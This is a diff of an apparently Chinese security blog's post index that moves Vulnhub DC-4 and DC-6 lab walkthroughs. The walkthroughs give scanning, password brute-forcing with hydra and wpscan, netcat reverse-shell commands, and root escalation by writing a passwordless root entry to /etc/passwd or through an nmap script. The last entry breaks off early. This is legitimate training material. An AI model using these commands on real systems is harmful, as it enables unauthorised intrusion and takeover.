@@ -480,139 +480,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Vulnhub-DC-4渗透学习</title>
-    <url>/2022/07/04/Vulnhub-DC-4/</url>
-    <content><![CDATA[<h1 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h1><blockquote>
-<p>攻击机：Kali-2021.3：192.168.8.105</p>
-<p>靶机：Vulnhub-DC-4：192.168.8.168</p>
-</blockquote>
-<h1 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h1><p>主机探活</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.8.0/24</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/07/04/Vulnhub-DC-4/1.png" alt></p>
-<p>扫描靶机ip</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -A -p- 192.168.8.168</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/07/04/Vulnhub-DC-4/2.png" alt></p>
-<p>发现开放了22和80端口，把信息都记录起来</p>
-<p>继续收集信息</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">whatweb 192.168.8.168:80</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/07/04/Vulnhub-DC-4/3.png" alt></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nikto -host 192.168.8.168</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/07/04/Vulnhub-DC-4/4.png" alt></p>
-<p>nikto是kali自带的工具，用于扫描网站后台文件</p>
-<p>扫描完后发现并没有什么有用的信息了，也没有发现网站的框架、CMS等有用的信息</p>
-<h1 id="三、实战"><a href="#三、实战" class="headerlink" title="三、实战"></a>三、实战</h1><p>先尝试访问IP的80端口</p>
-<p><img src="/2022/07/04/Vulnhub-DC-4/5.png" alt></p>
-<p>发现是个登录入口，查看源代码，感觉就只是一个简单的登录窗口</p>
-<p><img src="/2022/07/04/Vulnhub-DC-4/6.png" alt></p>
-<p>既然是一个登录页面，尝试一下弱口令爆破吧，单独对密码进行爆破，字典使用Burp自带的</p>
-<p><img src="/2022/07/04/Vulnhub-DC-4/7.png" alt></p>
-<p><img src="/2022/07/04/Vulnhub-DC-4/8.png" alt></p>
-<p>爆破完之后发现密码为：happy</p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>得到的账号密码</p>
-<blockquote>
-<p>admin</p>
-<p>happy</p>
-</blockquote>
-<p>回到登录页面进行登录，第一次登录后页面并没有改变，再次登录后才能登录成功</p>
-<p><img src="/2022/07/04/Vulnhub-DC-4/9.png" alt></p>
-<p>随便试试，发现里面可以执行命令，怀疑有命令执行的漏洞</p>
-<p><img src="/2022/07/04/Vulnhub-DC-4/10.png" alt></p>
-<p>把数据包拦截可以看到确实有命令执行</p>
-<p><img src="/2022/07/04/Vulnhub-DC-4/11.png" alt></p>
-<p>既然是命令执行，为了方便我们的操作，反弹一下shell吧</p>
-<p>kali开启监听</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -lvp 2222</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/07/04/Vulnhub-DC-4/12.png" alt></p>
-<p>然后在目标上执行</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -e /bin/bash 192.168.8.105 2222</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/07/04/Vulnhub-DC-4/13.png" alt></p>
-<p>成功拿到shell</p>
-<p><img src="/2022/07/04/Vulnhub-DC-4/14.png" alt></p>
-<p>再利用python得到交互式shell</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/07/04/Vulnhub-DC-4/15.png" alt></p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>我们都知道，flag大概率在root中，但很明显我们的权限不够，需要提权</p>
-<ol>
-<li><p>SUID提权</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/07/04/Vulnhub-DC-4/16.png" alt></p>
-<p>但是并没有常见的可提权的文件，比如：</p>
-<blockquote>
-<p>nmap、vim、find、bash、more、less、nano、cp</p>
-</blockquote>
-</li>
-<li><p>免密使用的root级别命令</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/07/04/Vulnhub-DC-4/17.png" alt></p>
-<p>但是发现需要密码，而我们没有密码，也行不通</p>
-</li>
-</ol>
-<p>好像走到尽头了，但别忘了我们扫到它的ssh端口是开放的，因此去寻找一下存在的ssh用户</p>
-<p><img src="/2022/07/04/Vulnhub-DC-4/18.png" alt></p>
-<p>发现存在三个用户</p>
-<p>分别进去查看一下有什么文件，发现里面只有jim用户里存有文件，然后就是不断的寻找有用的文件了，最终发现了一个存有密码的文件</p>
-<p><img src="/2022/07/04/Vulnhub-DC-4/19.png" alt></p>
-<p><img src="/2022/07/04/Vulnhub-DC-4/20.png" alt></p>
-<p>那接下来思路就很明确了，爆破这个用户就行了</p>
-<p>首先将密码保存到本机的passwd.txt中，用户名就jim一个就行</p>
-<p><img src="/2022/07/04/Vulnhub-DC-4/21.png" alt></p>
-<p>然后利用hydra进行爆破</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hydra 192.168.8.168 -L user.txt -P passwd.txt ssh</span><br></pre></td></tr></table></figure>
-<p>成功获得jim的密码</p>
-<blockquote>
-<p>jibril04</p>
-</blockquote>
-<p><img src="/2022/07/04/Vulnhub-DC-4/22.png" alt></p>
-<p>接着利用刚刚的账号密码连接ssh进行登录</p>
-<p><img src="/2022/07/04/Vulnhub-DC-4/23.png" alt></p>
-<p>成功登录，而且出现了一段文字，翻译一下</p>
-<blockquote>
-<p>Linux dc-4 4.9.0-3-686 #1 SMP Debian 4.9.30-2+deb9u5 (2017-09-19) i686</p>
-<p>Debian GNU/Linux 系统中包含的程序是免费软件；<br>每个程序的确切分配条款在<br>/usr/share/doc/*/copyright 中的单个文件。</p>
-<p>Debian GNU/Linux 绝对没有担保，在某种程度上<br>适用法律允许。<br>你有新邮件。</p>
-</blockquote>
-<p>似乎是这个系统在每个用户登录的时候发给他的通知，在最下面可以看到说jim收到了一封新邮件，那我们就去寻找一下这封邮件看看，在var目录下发现了mail</p>
-<p><img src="/2022/07/04/Vulnhub-DC-4/24.png" alt></p>
-<p><img src="/2022/07/04/Vulnhub-DC-4/25.png" alt></p>
-<p>翻译看看就能发现里面有另一个用户charles的密码</p>
-<blockquote>
-<p>^xHhA&amp;hvim0y</p>
-</blockquote>
-<p>现在我们可以切换目录了，但是先测试一下jim用户能不能利用SUID提权和免密使用root命令</p>
-<p><img src="/2022/07/04/Vulnhub-DC-4/26.png" alt></p>
-<p>但是都没有成功，那就切换到charles用户试试</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">su charles</span><br></pre></td></tr></table></figure>
-<p>成功切换用户，然后继续尝试上面两种提权方式</p>
-<p><img src="/2022/07/04/Vulnhub-DC-4/27.png" alt></p>
-<p>发现了一个可以免密使用的root命令：teehee</p>
-<p>百度一下就知道这是一个编辑器，可以用来提权</p>
-<p><a href="https://www.cnblogs.com/zlgxzswjy/p/16118468.html">teehee 提权 - 隐念笎 - 博客园</a></p>
-<p>提权思路就是利用teehee的root权限在passwd中写入一个免密的root权限用户</p>
-<p>使用echo 命令与 sudo 命令配合使用，可以实现向那些只有系统管理员才有权限操作的文件中写入信息</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;abab::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd</span><br><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/07/04/Vulnhub-DC-4/28.png" alt></p>
-<blockquote>
-<p>passwd文件解读：（简单理解这个即可）<br><code>root:x:0:0::/home/admin:/bin/bash</code><br>[用户名]：[密码]：[UID]：[GID]：[身份描述]：[主目录]：[登录shell]<br>“-a” 选项的作用等同于 “&gt;&gt;” 命令<br>【额外补充：没有给新用户创建密码是因为你创建了也没有用，因为第2个位置是密码占位符，是占位符！！】</p>
-</blockquote>
-<p>然后切换到我们新添加的用户名</p>
-<p>成功拿到root权限，后面就进入root目录，就能成功得到flag</p>
-<p><img src="/2022/07/04/Vulnhub-DC-4/29.png" alt></p>
-<p><img src="/2022/07/04/Vulnhub-DC-4/30.png" alt></p>
-<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://blog.csdn.net/m0_62094846/article/details/125535798">DC4-靶机</a></p>
-<p><a href="https://blog.csdn.net/qq_61237064/article/details/123594413?spm=1001.2014.3001.5502">dc-4 靶机渗透学习</a></p>
-<p><a href="https://zhuanlan.zhihu.com/p/397779150">黑客工具之hydra详细使用教程</a></p>
-<p><a href="https://www.cnblogs.com/backlion/p/10503978.html">编辑/etc/passwd文件进行权限升级的技巧</a></p>
-]]></content>
-      <categories>
-        <category>靶场&amp;靶机</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>靶机</tag>
-        <tag>渗透测试</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Vulnhub-DC-3渗透学习</title>
     <url>/2022/06/11/Vulnhub-DC-3/</url>
     <content><![CDATA[<h1 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h1><blockquote>
@@ -776,126 +643,128 @@
       </tags>
   </entry>
   <entry>
-    <title>Vulnhub-DC-6渗透学习</title>
-    <url>/2022/08/12/Vulnhub-DC-6/</url>
+    <title>Vulnhub-DC-4渗透学习</title>
+    <url>/2022/07/04/Vulnhub-DC-4/</url>
     <content><![CDATA[<h1 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h1><blockquote>
-<p>攻击机：Kali-2021.3：192.168.11.132</p>
-<p>靶机：Vulnhub-DC-6：192.168.11.140</p>
+<p>攻击机：Kali-2021.3：192.168.8.105</p>
+<p>靶机：Vulnhub-DC-4：192.168.8.168</p>
 </blockquote>
 <h1 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h1><p>主机探活</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.11.0/24</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/12/Vulnhub-DC-6/1.png" alt></p>
-<p>扫描目标端口</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -A -p- 192.168.11.140</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/12/Vulnhub-DC-6/2.png" alt></p>
-<p>发现开启了80端口，同时发现CMS是<strong>WordPress</strong></p>
-<p>先尝试访问，发现会自动跳转到域名<code>wordy</code></p>
-<p><img src="/2022/08/12/Vulnhub-DC-6/3.png" alt></p>
-<p>因此修改一下<strong>hosts</strong>文件，加入内容：<code>192.168.11.140 wordy</code></p>
-<p>保存即可，再次访问即可访问成功</p>
-<p><img src="/2022/08/12/Vulnhub-DC-6/4.png" alt></p>
-<p>既然已经知道CMS是WordPress了，那就直接用wpscan开始扫描</p>
-<p>列举用户名</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wpscan --url http://wordy/ --enumerate u</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/12/Vulnhub-DC-6/5.png" alt></p>
-<p>成功找到五个用户</p>
-<p>将五个用户名存入txt</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo -e &quot;admin \njens \ngraham \nmark \nsarah&quot; &gt; users.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/12/Vulnhub-DC-6/6.png" alt></p>
-<p>在DC-6的官网中有个提示</p>
-<p><img src="/2022/08/12/Vulnhub-DC-6/7.png" alt></p>
-<p>因此这个很有可能就是我们需要的密码</p>
-<p>进入目录，发现还未解压，那么就解压一下</p>
-<p>参考解压方式：</p>
-<ol>
-<li><code>*.tar</code> 用<code>tar –xvf</code>解压</li>
-<li><code>*.gz</code> 用 <code>gzip -d</code>或者<code>gunzip</code>解压</li>
-<li><code>*.tar.gz</code>和<code>*.tgz</code> 用<code>tar –xzf</code>解压</li>
-<li><code>*.bz2</code>用<code>bzip2 -d</code>或者用<code>bunzip2</code>解压</li>
-<li><code>*.tar.bz2</code>用<code>tar –xjf</code>解压</li>
-<li><code>*.Z</code>用<code>uncompress</code>解压</li>
-<li><code>*.tar.Z</code>用<code>tar –xZf</code>解压</li>
-<li><code>*.rar</code>用<code>unrar e</code>解压</li>
-<li><code>*.zip</code>用<code>unzip</code>解压</li>
-<li><code>*.xz</code>用<code>xz -d</code>解压</li>
-<li><code>*.tar.xz</code>用<code>tar -zJf</code>解压</li>
-</ol>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gzip -d rockyou.txt.gz &gt; rockyou.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/12/Vulnhub-DC-6/8.png" alt></p>
-<p>然后根据提示将这个密码中关于”k01”部分的密码复制出来</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/12/Vulnhub-DC-6/9.png" alt></p>
-<h1 id="三、实战"><a href="#三、实战" class="headerlink" title="三、实战"></a>三、实战</h1><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>通过信息收集我们得到了用户名和密码，那么就能通过<code>wpscan</code>尝试暴力破解</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wpscan --url http://wordy/ -U users.txt -P passwords.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/12/Vulnhub-DC-6/10.png" alt></p>
-<p>得到账号密码：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.8.0/24</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/07/04/Vulnhub-DC-4/1.png" alt></p>
+<p>扫描靶机ip</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -A -p- 192.168.8.168</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/07/04/Vulnhub-DC-4/2.png" alt></p>
+<p>发现开放了22和80端口，把信息都记录起来</p>
+<p>继续收集信息</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">whatweb 192.168.8.168:80</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/07/04/Vulnhub-DC-4/3.png" alt></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nikto -host 192.168.8.168</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/07/04/Vulnhub-DC-4/4.png" alt></p>
+<p>nikto是kali自带的工具，用于扫描网站后台文件</p>
+<p>扫描完后发现并没有什么有用的信息了，也没有发现网站的框架、CMS等有用的信息</p>
+<h1 id="三、实战"><a href="#三、实战" class="headerlink" title="三、实战"></a>三、实战</h1><p>先尝试访问IP的80端口</p>
+<p><img src="/2022/07/04/Vulnhub-DC-4/5.png" alt></p>
+<p>发现是个登录入口，查看源代码，感觉就只是一个简单的登录窗口</p>
+<p><img src="/2022/07/04/Vulnhub-DC-4/6.png" alt></p>
+<p>既然是一个登录页面，尝试一下弱口令爆破吧，单独对密码进行爆破，字典使用Burp自带的</p>
+<p><img src="/2022/07/04/Vulnhub-DC-4/7.png" alt></p>
+<p><img src="/2022/07/04/Vulnhub-DC-4/8.png" alt></p>
+<p>爆破完之后发现密码为：happy</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>得到的账号密码</p>
 <blockquote>
-<p>mark / helpdesk01</p>
+<p>admin</p>
+<p>happy</p>
 </blockquote>
-<p>然后用<code>dirsearch</code>找一下后台登录入口</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -u http://192.168.11.140</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/12/Vulnhub-DC-6/11.png" alt></p>
-<p>登录mark的账号</p>
-<p><img src="/2022/08/12/Vulnhub-DC-6/12.png" alt></p>
-<p>寻找一下有没有利用点</p>
-<p>然后在<code>Activity monitor → Tools</code>的<code>&quot;Lookup&quot;</code>里发现有命令执行漏洞</p>
-<p><img src="/2022/08/12/Vulnhub-DC-6/13.png" alt></p>
-<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>那接下来就反弹一下shell吧，因为在网页里命令的长度受到了限制，因此我们可以用burp抓个包，然后写入命令</p>
-<p><img src="/2022/08/12/Vulnhub-DC-6/14.png" alt></p>
-<p>开启监听：</p>
+<p>回到登录页面进行登录，第一次登录后页面并没有改变，再次登录后才能登录成功</p>
+<p><img src="/2022/07/04/Vulnhub-DC-4/9.png" alt></p>
+<p>随便试试，发现里面可以执行命令，怀疑有命令执行的漏洞</p>
+<p><img src="/2022/07/04/Vulnhub-DC-4/10.png" alt></p>
+<p>把数据包拦截可以看到确实有命令执行</p>
+<p><img src="/2022/07/04/Vulnhub-DC-4/11.png" alt></p>
+<p>既然是命令执行，为了方便我们的操作，反弹一下shell吧</p>
+<p>kali开启监听</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -lvp 2222</span><br></pre></td></tr></table></figure>
-<p>反弹shell：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -e /bin/bash 192.168.11.132 2222</span><br></pre></td></tr></table></figure>
-<p>最后再用python换成交互shell</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/12/Vulnhub-DC-6/15.png" alt></p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>尝试能不能<code>suid</code>提权，但并没有好的利用点</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/12/Vulnhub-DC-6/16.png" alt></p>
-<p>尝试免密使用的root命令，但需要密码，并不行</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/12/Vulnhub-DC-6/17.png" alt></p>
-<p>那么就找找信息吧，进入到<code>home</code>目录，发现在<code>mark → stuff</code>里有另一个用户<code>graham</code>的密码</p>
-<p><img src="/2022/08/12/Vulnhub-DC-6/18.png" alt></p>
-<blockquote>
-<p>graham / GSo7isUM1D4</p>
-</blockquote>
-<p>切换用户</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">su graham</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/12/Vulnhub-DC-6/19.png" alt></p>
-<p>再次尝试suid提权，但和上一个用户一样没什么可用的</p>
-<p>查看免密使用的root权限命令，发现存在一个可以通过<code>jens</code>的身份去使用的备份文件</p>
-<p><img src="/2022/08/12/Vulnhub-DC-6/20.png" alt></p>
-<p>那么接下来的思路就是在这个备份文件中写入<code>/bin/bash</code>然后以<code>jens</code>运行这个<code>sh</code>文件即可得到目标shell</p>
-<p>写入/bin/bash</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;/bin/bash&quot; &gt;&gt; backups.sh</span><br></pre></td></tr></table></figure>
-<p>以jens身份运行得到shell</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo -u jens ./backups.sh</span><br></pre></td></tr></table></figure>
-<p>成功得到jens用户的shell</p>
-<p><img src="/2022/08/12/Vulnhub-DC-6/21.png" alt></p>
-<p>叒尝试suid提权，一样没有利用点</p>
-<p>查看免密使用的root权限命令，似乎有机会</p>
-<p><img src="/2022/08/12/Vulnhub-DC-6/22.png" alt></p>
-<p>查看一下<code>nmap</code>提权，分两种情况</p>
+<p><img src="/2022/07/04/Vulnhub-DC-4/12.png" alt></p>
+<p>然后在目标上执行</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -e /bin/bash 192.168.8.105 2222</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/07/04/Vulnhub-DC-4/13.png" alt></p>
+<p>成功拿到shell</p>
+<p><img src="/2022/07/04/Vulnhub-DC-4/14.png" alt></p>
+<p>再利用python得到交互式shell</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/07/04/Vulnhub-DC-4/15.png" alt></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>我们都知道，flag大概率在root中，但很明显我们的权限不够，需要提权</p>
 <ol>
-<li><p>SUID，那就直接提权</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap --interactive</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>只有单个用户被分配有root权限</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;os.execute(&#x27;/bin/bash&#x27;)&quot; &gt; shell.nse</span><br><span class="line">sudo nmap --script=shell.nse</span><br></pre></td></tr></table></figure>
+<li><p>SUID提权</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/07/04/Vulnhub-DC-4/16.png" alt></p>
+<p>但是并没有常见的可提权的文件，比如：</p>
 <blockquote>
-<p><code>os.execute</code>和C语言中的<code>system()</code>命令是一样的</p>
-<p><code>--script</code>是指出nmap所要执行的脚本文件</p>
+<p>nmap、vim、find、bash、more、less、nano、cp</p>
 </blockquote>
+</li>
+<li><p>免密使用的root级别命令</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/07/04/Vulnhub-DC-4/17.png" alt></p>
+<p>但是发现需要密码，而我们没有密码，也行不通</p>
 </li>
 </ol>
-<p>在我们这里很明显是第二种情况</p>
-<p><img src="/2022/08/12/Vulnhub-DC-6/23.png" alt></p>
-<p>提权成功，拿到flag</p>
-<p><img src="/2022/08/12/Vulnhub-DC-6/24.png" alt></p>
-<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://blog.csdn.net/qq_61237064/article/details/123644264?spm=1001.2014.3001.5502">dc-6 靶机渗透学习</a></p>
-<p><a href="https://www.freebuf.com/articles/system/261271.html">Linux通过第三方应用提权实战总结</a></p>
-<p><a href="https://blog.csdn.net/zijiaijd/article/details/117165224">nmap提权几种方式</a></p>
+<p>好像走到尽头了，但别忘了我们扫到它的ssh端口是开放的，因此去寻找一下存在的ssh用户</p>
+<p><img src="/2022/07/04/Vulnhub-DC-4/18.png" alt></p>
+<p>发现存在三个用户</p>
+<p>分别进去查看一下有什么文件，发现里面只有jim用户里存有文件，然后就是不断的寻找有用的文件了，最终发现了一个存有密码的文件</p>
+<p><img src="/2022/07/04/Vulnhub-DC-4/19.png" alt></p>
+<p><img src="/2022/07/04/Vulnhub-DC-4/20.png" alt></p>
+<p>那接下来思路就很明确了，爆破这个用户就行了</p>
+<p>首先将密码保存到本机的passwd.txt中，用户名就jim一个就行</p>
+<p><img src="/2022/07/04/Vulnhub-DC-4/21.png" alt></p>
+<p>然后利用hydra进行爆破</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hydra 192.168.8.168 -L user.txt -P passwd.txt ssh</span><br></pre></td></tr></table></figure>
+<p>成功获得jim的密码</p>
+<blockquote>
+<p>jibril04</p>
+</blockquote>
+<p><img src="/2022/07/04/Vulnhub-DC-4/22.png" alt></p>
+<p>接着利用刚刚的账号密码连接ssh进行登录</p>
+<p><img src="/2022/07/04/Vulnhub-DC-4/23.png" alt></p>
+<p>成功登录，而且出现了一段文字，翻译一下</p>
+<blockquote>
+<p>Linux dc-4 4.9.0-3-686 #1 SMP Debian 4.9.30-2+deb9u5 (2017-09-19) i686</p>
+<p>Debian GNU/Linux 系统中包含的程序是免费软件；<br>每个程序的确切分配条款在<br>/usr/share/doc/*/copyright 中的单个文件。</p>
+<p>Debian GNU/Linux 绝对没有担保，在某种程度上<br>适用法律允许。<br>你有新邮件。</p>
+</blockquote>
+<p>似乎是这个系统在每个用户登录的时候发给他的通知，在最下面可以看到说jim收到了一封新邮件，那我们就去寻找一下这封邮件看看，在var目录下发现了mail</p>
+<p><img src="/2022/07/04/Vulnhub-DC-4/24.png" alt></p>
+<p><img src="/2022/07/04/Vulnhub-DC-4/25.png" alt></p>
+<p>翻译看看就能发现里面有另一个用户charles的密码</p>
+<blockquote>
+<p>^xHhA&amp;hvim0y</p>
+</blockquote>
+<p>现在我们可以切换目录了，但是先测试一下jim用户能不能利用SUID提权和免密使用root命令</p>
+<p><img src="/2022/07/04/Vulnhub-DC-4/26.png" alt></p>
+<p>但是都没有成功，那就切换到charles用户试试</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">su charles</span><br></pre></td></tr></table></figure>
+<p>成功切换用户，然后继续尝试上面两种提权方式</p>
+<p><img src="/2022/07/04/Vulnhub-DC-4/27.png" alt></p>
+<p>发现了一个可以免密使用的root命令：teehee</p>
+<p>百度一下就知道这是一个编辑器，可以用来提权</p>
+<p><a href="https://www.cnblogs.com/zlgxzswjy/p/16118468.html">teehee 提权 - 隐念笎 - 博客园</a></p>
+<p>提权思路就是利用teehee的root权限在passwd中写入一个免密的root权限用户</p>
+<p>使用echo 命令与 sudo 命令配合使用，可以实现向那些只有系统管理员才有权限操作的文件中写入信息</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;abab::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd</span><br><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/07/04/Vulnhub-DC-4/28.png" alt></p>
+<blockquote>
+<p>passwd文件解读：（简单理解这个即可）<br><code>root:x:0:0::/home/admin:/bin/bash</code><br>[用户名]：[密码]：[UID]：[GID]：[身份描述]：[主目录]：[登录shell]<br>“-a” 选项的作用等同于 “&gt;&gt;” 命令<br>【额外补充：没有给新用户创建密码是因为你创建了也没有用，因为第2个位置是密码占位符，是占位符！！】</p>
+</blockquote>
+<p>然后切换到我们新添加的用户名</p>
+<p>成功拿到root权限，后面就进入root目录，就能成功得到flag</p>
+<p><img src="/2022/07/04/Vulnhub-DC-4/29.png" alt></p>
+<p><img src="/2022/07/04/Vulnhub-DC-4/30.png" alt></p>
+<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://blog.csdn.net/m0_62094846/article/details/125535798">DC4-靶机</a></p>
+<p><a href="https://blog.csdn.net/qq_61237064/article/details/123594413?spm=1001.2014.3001.5502">dc-4 靶机渗透学习</a></p>
+<p><a href="https://zhuanlan.zhihu.com/p/397779150">黑客工具之hydra详细使用教程</a></p>
+<p><a href="https://www.cnblogs.com/backlion/p/10503978.html">编辑/etc/passwd文件进行权限升级的技巧</a></p>
 ]]></content>
       <categories>
         <category>靶场&amp;靶机</category>
@@ -1021,6 +890,137 @@
 <h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://blog.csdn.net/qq_61237064/article/details/123612366?spm=1001.2014.3001.5502">dc-5 靶机渗透学习</a></p>
 <p><a href="https://cloud.tencent.com/developer/article/1844735">Linux终端命令神器—Screen命令详解。助力Linux使用和管理</a></p>
 <p><a href="https://blog.csdn.net/weixin_43583637/article/details/102769923?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control">Vulnhub靶机实战——DC-5</a></p>
+]]></content>
+      <categories>
+        <category>靶场&amp;靶机</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>靶机</tag>
+        <tag>渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Vulnhub-DC-6渗透学习</title>
+    <url>/2022/08/12/Vulnhub-DC-6/</url>
+    <content><![CDATA[<h1 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h1><blockquote>
+<p>攻击机：Kali-2021.3：192.168.11.132</p>
+<p>靶机：Vulnhub-DC-6：192.168.11.140</p>
+</blockquote>
+<h1 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h1><p>主机探活</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.11.0/24</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/12/Vulnhub-DC-6/1.png" alt></p>
+<p>扫描目标端口</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -A -p- 192.168.11.140</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/12/Vulnhub-DC-6/2.png" alt></p>
+<p>发现开启了80端口，同时发现CMS是<strong>WordPress</strong></p>
+<p>先尝试访问，发现会自动跳转到域名<code>wordy</code></p>
+<p><img src="/2022/08/12/Vulnhub-DC-6/3.png" alt></p>
